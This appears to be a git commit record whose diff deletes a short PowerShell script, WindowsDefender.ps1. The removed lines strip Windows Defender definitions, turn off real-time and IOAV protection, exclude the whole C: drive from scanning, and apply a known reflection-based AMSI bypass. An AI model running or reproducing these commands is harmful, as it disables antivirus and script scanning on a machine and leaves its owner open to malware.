e0a585906a593f5aa593423f5691f5fc63d9fdf8
Ashton Fox <61950589+ashscottf@users.noreply.github.com>
2022-08-11 16:18:23 -0500

    Delete WindowsDefender.ps1

--- WindowsDefender.ps1
+++
@@ -1,3 +0,0 @@
-"${env:ProgramFiles}\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true;
-Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "c:/";  
-"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
